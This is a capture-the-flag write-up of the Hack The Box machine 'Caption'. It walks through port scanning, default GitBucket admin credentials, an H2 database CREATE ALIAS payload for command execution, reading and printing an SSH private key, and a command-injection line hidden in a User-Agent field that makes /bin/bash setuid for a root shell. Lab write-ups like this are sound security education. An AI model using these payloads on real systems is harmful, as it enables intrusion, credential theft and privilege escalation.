---
title: Caption
date: 2025-02-03
author: Flavien
draft: false
tags:
  - CTF
  - HTB
  - Machine
  - Box
categories:
  - Writeup
  - Box
  - Machine
description: HTB writeup for the machine "Caption"
summary: A complete walkthrough of the Caption Hack The Box box, covering enumeration, exploitation, and privilege escalation.
---
## Enumeration

```bash
PORT     STATE SERVICE    REASON  VERSION
22/tcp   open  ssh        syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp   open  http       syn-ack
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, RTSPRequest, X11Probe: 
|     HTTP/1.1 400 Bad request
|     Content-length: 90
|     Cache-Control: no-cache
|     Connection: close
|     Content-Type: text/html
|     <html><body><h1>400 Bad request</h1>
|     Your browser sent an invalid request.
|     </body></html>
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.1 301 Moved Permanently
|     content-length: 0
|     location: http://caption.htb
|_    connection: close
|_http-title: Did not follow redirect to http://caption.htb
8080/tcp open  http-proxy syn-ack
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: GitBucket
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Date: Mon, 16 Sep 2024 07:24:37 GMT
|     Set-Cookie: JSESSIONID=node01twwz3kp29jtu49mlm2sbel32.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 5920
|     <!DOCTYPE html>
|     <html prefix="og: http://ogp.me/ns#" lang="en">
|     <head>
|     <meta charset="UTF-8" />
|     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
|     <title>Error</title>
|     <meta property="og:title" content="Error" />
|     <meta property="og:type" content="object" />
|     <meta property="og:url" content="http://10.129.145.80:8080/nice%20ports%2C/Tri%6Eity.txt%2ebak" />
|     <meta property="og:image" content="http://10.129.145.80:8080/assets/common/images/gitbucket_ogp.png" />
|     <link rel="icon" href="/assets/common/images
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Mon, 16 Sep 2024 07:24:36 GMT
|     Set-Cookie: JSESSIONID=node01ou2khby5o8po8hgc9nm5flrm0.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 7195
|     <!DOCTYPE html>
|     <html prefix="og: http://ogp.me/ns#" lang="en">
|     <head>
|     <meta charset="UTF-8" />
|     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
|     <title>GitBucket</title>
|     <meta property="og:title" content="GitBucket" />
|     <meta property="og:type" content="object" />
|     <meta property="og:url" content="http://10.129.145.80:8080/" />
|     <meta property="og:image" content="http://10.129.145.80:8080/assets/common/images/gitbucket_ogp.png" />
|     <link rel="icon" href="/assets/common/images/gitbucket.png?20240916072436" ty
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Mon, 16 Sep 2024 07:24:37 GMT
|     Set-Cookie: JSESSIONID=node0tlwrkkhy6fo61sthbzxusxjfm1.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Allow: GET,HEAD,POST,OPTIONS
|     Content-Length: 0
|   RTSPRequest: 
|     HTTP/1.1 505 HTTP Version Not Supported
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|_    <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.94SVN%I=7%D=9/16%Time=66E7DD35%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,66,"HTTP/1\.1\x20301\x20Moved\x20Permanently\r\ncontent-lengt
SF:h:\x200\r\nlocation:\x20http://caption\.htb\r\nconnection:\x20close\r\n
SF:\r\n")%r(HTTPOptions,66,"HTTP/1\.1\x20301\x20Moved\x20Permanently\r\nco
SF:ntent-length:\x200\r\nlocation:\x20http://caption\.htb\r\nconnection:\x
SF:20close\r\n\r\n")%r(RTSPRequest,CF,"HTTP/1\.1\x20400\x20Bad\x20request\
SF:r\nContent-length:\x2090\r\nCache-Control:\x20no-cache\r\nConnection:\x
SF:20close\r\nContent-Type:\x20text/html\r\n\r\n<html><body><h1>400\x20Bad
SF:\x20request</h1>\nYour\x20browser\x20sent\x20an\x20invalid\x20request\.
SF:\n</body></html>\n")%r(X11Probe,CF,"HTTP/1\.1\x20400\x20Bad\x20request\
SF:r\nContent-length:\x2090\r\nCache-Control:\x20no-cache\r\nConnection:\x
SF:20close\r\nContent-Type:\x20text/html\r\n\r\n<html><body><h1>400\x20Bad
SF:\x20request</h1>\nYour\x20browser\x20sent\x20an\x20invalid\x20request\.
SF:\n</body></html>\n")%r(FourOhFourRequest,66,"HTTP/1\.1\x20301\x20Moved\
SF:x20Permanently\r\ncontent-length:\x200\r\nlocation:\x20http://caption\.
SF:htb\r\nconnection:\x20close\r\n\r\n")%r(RPCCheck,CF,"HTTP/1\.1\x20400\x
SF:20Bad\x20request\r\nContent-length:\x2090\r\nCache-Control:\x20no-cache
SF:\r\nConnection:\x20close\r\nContent-Type:\x20text/html\r\n\r\n<html><bo
SF:dy><h1>400\x20Bad\x20request</h1>\nYour\x20browser\x20sent\x20an\x20inv
SF:alid\x20request\.\n</body></html>\n")%r(DNSVersionBindReqTCP,CF,"HTTP/1
SF:\.1\x20400\x20Bad\x20request\r\nContent-length:\x2090\r\nCache-Control:
SF:\x20no-cache\r\nConnection:\x20close\r\nContent-Type:\x20text/html\r\n\
SF:r\n<html><body><h1>400\x20Bad\x20request</h1>\nYour\x20browser\x20sent\
SF:x20an\x20invalid\x20request\.\n</body></html>\n")%r(DNSStatusRequestTCP
SF:,CF,"HTTP/1\.1\x20400\x20Bad\x20request\r\nContent-length:\x2090\r\nCac
SF:he-Control:\x20no-cache\r\nConnection:\x20close\r\nContent-Type:\x20tex
SF:t/html\r\n\r\n<html><body><h1>400\x20Bad\x20request</h1>\nYour\x20brows
SF:er\x20sent\x20an\x20invalid\x20request\.\n</body></html>\n")%r(Help,CF,
SF:"HTTP/1\.1\x20400\x20Bad\x20request\r\nContent-length:\x2090\r\nCache-C
SF:ontrol:\x20no-cache\r\nConnection:\x20close\r\nContent-Type:\x20text/ht
SF:ml\r\n\r\n<html><body><h1>400\x20Bad\x20request</h1>\nYour\x20browser\x
SF:20sent\x20an\x20invalid\x20request\.\n</body></html>\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8080-TCP:V=7.94SVN%I=7%D=9/16%Time=66E7DD36%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,19F0,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Mon,\x2016\x20Sep\
SF:x202024\x2007:24:36\x20GMT\r\nSet-Cookie:\x20JSESSIONID=node01ou2khby5o
SF:8po8hgc9nm5flrm0\.node0;\x20Path=/;\x20HttpOnly\r\nExpires:\x20Thu,\x20
SF:01\x20Jan\x201970\x2000:00:00\x20GMT\r\nContent-Type:\x20text/html;char
SF:set=utf-8\r\nContent-Length:\x207195\r\n\r\n<!DOCTYPE\x20html>\n<html\x
SF:20prefix=\"og:\x20http://ogp\.me/ns#\"\x20lang=\"en\">\n\x20\x20<head>\
SF:n\x20\x20\x20\x20<meta\x20charset=\"UTF-8\"\x20/>\n\x20\x20\x20\x20<met
SF:a\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-scal
SF:e=1\.0,\x20maximum-scale=5\.0\"\x20/>\n\x20\x20\x20\x20<meta\x20http-eq
SF:uiv=\"X-UA-Compatible\"\x20content=\"IE=edge\"\x20/>\n\x20\x20\x20\x20<
SF:title>GitBucket</title>\n\x20\x20\x20\x20<meta\x20property=\"og:title\"
SF:\x20content=\"GitBucket\"\x20/>\n\x20\x20\x20\x20<meta\x20property=\"og
SF::type\"\x20content=\"object\"\x20/>\n\x20\x20\x20\x20<meta\x20property=
SF:\"og:url\"\x20content=\"http://10\.129\.145\.80:8080/\"\x20/>\n\x20\x20
SF:\x20\x20\n\x20\x20\x20\x20\x20\x20<meta\x20property=\"og:image\"\x20con
SF:tent=\"http://10\.129\.145\.80:8080/assets/common/images/gitbucket_ogp\
SF:.png\"\x20/>\n\x20\x20\x20\x20\n\x20\x20\x20\x20\n\x20\x20\x20\x20<link
SF:\x20rel=\"icon\"\x20href=\"/assets/common/images/gitbucket\.png\?202409
SF:16072436\"\x20ty")%r(HTTPOptions,108,"HTTP/1\.1\x20200\x20OK\r\nDate:\x
SF:20Mon,\x2016\x20Sep\x202024\x2007:24:37\x20GMT\r\nSet-Cookie:\x20JSESSI
SF:ONID=node0tlwrkkhy6fo61sthbzxusxjfm1\.node0;\x20Path=/;\x20HttpOnly\r\n
SF:Expires:\x20Thu,\x2001\x20Jan\x201970\x2000:00:00\x20GMT\r\nContent-Typ
SF:e:\x20text/html;charset=utf-8\r\nAllow:\x20GET,HEAD,POST,OPTIONS\r\nCon
SF:tent-Length:\x200\r\n\r\n")%r(RTSPRequest,B8,"HTTP/1\.1\x20505\x20HTTP\
SF:x20Version\x20Not\x20Supported\r\nContent-Type:\x20text/html;charset=is
SF:o-8859-1\r\nContent-Length:\x2058\r\nConnection:\x20close\r\n\r\n<h1>Ba
SF:d\x20Message\x20505</h1><pre>reason:\x20Unknown\x20Version</pre>")%r(Fo
SF:urOhFourRequest,1813,"HTTP/1\.1\x20404\x20Not\x20Found\r\nDate:\x20Mon,
SF:\x2016\x20Sep\x202024\x2007:24:37\x20GMT\r\nSet-Cookie:\x20JSESSIONID=n
SF:ode01twwz3kp29jtu49mlm2sbel32\.node0;\x20Path=/;\x20HttpOnly\r\nExpires
SF::\x20Thu,\x2001\x20Jan\x201970\x2000:00:00\x20GMT\r\nContent-Type:\x20t
SF:ext/html;charset=utf-8\r\nContent-Length:\x205920\r\n\r\n<!DOCTYPE\x20h
SF:tml>\n<html\x20prefix=\"og:\x20http://ogp\.me/ns#\"\x20lang=\"en\">\n\x
SF:20\x20<head>\n\x20\x20\x20\x20<meta\x20charset=\"UTF-8\"\x20/>\n\x20\x2
SF:0\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-width,\x2
SF:0initial-scale=1\.0,\x20maximum-scale=5\.0\"\x20/>\n\x20\x20\x20\x20<me
SF:ta\x20http-equiv=\"X-UA-Compatible\"\x20content=\"IE=edge\"\x20/>\n\x20
SF:\x20\x20\x20<title>Error</title>\n\x20\x20\x20\x20<meta\x20property=\"o
SF:g:title\"\x20content=\"Error\"\x20/>\n\x20\x20\x20\x20<meta\x20property
SF:=\"og:type\"\x20content=\"object\"\x20/>\n\x20\x20\x20\x20<meta\x20prop
SF:erty=\"og:url\"\x20content=\"http://10\.129\.145\.80:8080/nice%20ports%
SF:2C/Tri%6Eity\.txt%2ebak\"\x20/>\n\x20\x20\x20\x20\n\x20\x20\x20\x20\x20
SF:\x20<meta\x20property=\"og:image\"\x20content=\"http://10\.129\.145\.80
SF::8080/assets/common/images/gitbucket_ogp\.png\"\x20/>\n\x20\x20\x20\x20
SF:\n\x20\x20\x20\x20\n\x20\x20\x20\x20<link\x20rel=\"icon\"\x20href=\"/as
SF:sets/common/images");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We discover 3 open ports: 22 running ssh and 80 + 8080 running http

==> We notice a domain name `http://caption.htb`that we can add to our hosts file and we also see that port 8080 seems to be running a `gitbucket`instance

### Port 80

We see this website and it gives us a login platform where we can try some default credentials but none of them work

![image](Caption_80.png)

--> Move on and come back to it later 

### Port 8080

We see a `gitbucket`instance and there is a `sign in`option that we can try --> it works with credentials `root:root`as these are the default credentials when setting up:

```
The default administrator account is root and password is root . Source code modifications are detected and a reloading happens automatically. You can modify the logging configuration by editing src/main/resources/logback-dev
```

![image](Caption_8080.png)

Then clicking on our profile and selecting `System administration`we see many things including the ability to query a database:

![image](Caption_db.png)

But it doesn't seem like we can do anything as we aren't able to retrieve any info from there

## Exploitation

We see this in the website that there is some information about the database:

![image](Caption_H2.png)

and we first notice a user: `margo`and also that the system is using an `H2 database`

We can also export the db content but we only find an uncrackable password hash:

```bash
$pbkdf2-sha256$100000$O5zdxA5m9ZtnSSMnUfXK4zw9j/8WgKxo9ItXxVIPw3s=$xUd/Zorr75r/yWR9IXkW7TJlLXuEH+3U1uMAm37cBMk=
```

==>We then discover [this](https://medium.com/r3d-buck3t/chaining-h2-database-vulnerabilities-for-rce-9b535a9621a2) exploit and we can try to make it work in order to get the user flag

==> We can then run the following query: 

```mysql
SELECT FILE_READ('/home/margo/user.txt',NULL) 
```

and we get the user flag!!!!

==================================================================

trying to run `SELECT FILE_READ('/root/root.txt',NULL)`gives us permission denied

==================================================================

## SSH key

We can create an alias for command execution following the exploit:

```mysql
CREATE ALIAS REVEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : ""; }$$;
```

and we can then use it to gain command execution and thus, a reverse shell

```mysql
CALL REVEXEC('ls -la .ssh')

org.h2.jdbc.JdbcSQLDataException: Data conversion error converting "total 20 drwx------ 2 margo margo 4096 Sep 16 07:22 . 
drwxr-x--- 10 margo margo 4096 Aug 30 10:17 .. 
-rw------- 1 margo margo 175 Sep 16 07:22 authorized_keys 
-rw------- 1 margo margo 492 Sep 16 07:22 id_ecdsa 
-rw-r--r-- 1 margo margo 174 Sep 16 07:22 id_ecdsa.pub "
; SQL statement: CALL REVEXEC('ls -la .ssh') [22018-199]
```

and we see here that there is an ssh key --> we can cat it and use it to ssh:

```mysql
CALL REVEXEC('cat .ssh/id_ecdsa')

org.h2.jdbc.JdbcSQLDataException: Data conversion error converting "-----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS1zaGEy LW5pc3RwMjU2AAAACG5pc3RwMjU2AAAAQQRJJYs5L942EavjlNbchLEzgw5bl3lO0hGsq/Kj5j1p ng+//YAJW/9Bm0VI3RitP/hk2qPSiTh+ML1YEXf62qo1AAAAoBLXAf8S1wH/AAAAE2VjZHNhLXNo YTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEklizkv3jYRq+OU1tyEsTODDluXeU7SEayr8qPm PWmeD7/9gAlb/0GbRUjdGK0/+GTao9KJOH4wvVgRd/raqjUAAAAgLK+666yB9k8sf0NNw/stU+9f qVUSLZEfflUgKAHLocQAAAAAAQIDBAUGBwg= -----END OPENSSH PRIVATE KEY----- "; SQL statement: CALL REVEXEC('cat .ssh/id_ecdsa') [22018-199]
```

and we get in as user `margo`

## Privilege escalation

==> We can then list the services running on the ports on the local system:

```bash
margo@caption:~$ netstat -tlnp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      1044/java           
tcp        0      0 127.0.0.1:9090          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3923          0.0.0.0:*               LISTEN      1043/python3        
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      1046/python3        
tcp        0      0 127.0.0.1:6081          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:6082          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      - 
```

We also see in the `Gitbucket`instance that there is in the `root/Logservice`some files that say:

```
-   flag.IntVar(&port, "p", 9090, "Specify port")
- logs := fmt.Sprintf("echo 'IP Address: %s, User-Agent: %s, Timestamp: %s' >> output.log", ip, userAgent, timestamp)
-         exec.Command{"/bin/sh", "-c", logs}
```

so we can local forward port 9090 and then create a malicious payload to get a reverse shell as root 

```bash
ssh -L 9090:127.0.0.1:9090 -i id_rsa margo@10.129.145.31
```

then, we can create 2 scripts under `/tmp`, `malicious.log`and `payload.sh`:

```bash
127.0.0.1 "user-agent":"'; /bin/bash /tmp/payload.sh #"
```

```bash
chmod +s /bin/bash
```

Once that is done, we can copy the `log_service.thrift`on our machine and run the `thrift`command to generate the files for the client:

```go
namespace go log_service    
service LogService {  
	string ReadLogFile(1: string filePath)  
}  
```

and then using `thrift`: 

```go
thrift --gen py log_services.thrift
```

==> Then we can create the `client.py` file inside of the `gen-py`folder:

```python
from thrift import Thrift  
from thrift.transport import TSocket  
from thrift.transport import TTransport  
from thrift.protocol import TBinaryProtocol  
from log_service import LogService # Import generated Thrift client code  
  
def main():  
	# Set up a transport to the server  
	transport = TSocket.TSocket('localhost', 9090)  
	  
	# Buffering for performance  
	transport = TTransport.TBufferedTransport(transport)  
	  
	# Using a binary protocol  
	protocol = TBinaryProtocol.TBinaryProtocol(transport)  
	  
	# Create a client to use the service  
	client = LogService.Client(protocol)  
	  
	# Open the connection  
	transport.open()  
	  
	try:  
		# Specify the log file path to process  
		log_file_path = "/tmp/malicious.log"  
		  
		# Call the remote method ReadLogFile and get the result  
		response = client.ReadLogFile(log_file_path)  
		print("Server response:", response)  
	  
	except Thrift.TException as tx:  
		print(f"Thrift exception: {tx}")  
		  
		# Close the transport  
	transport.close()  
  
if __name__ == '__main__':  
	main()  
```

We can then run this file and we get:

```bash
python3 client.py  
Server response: Log file processed
```

and once back on `margo`'s machine we can type:

```bash
/bin/bash -p
```

and we get a root shell!!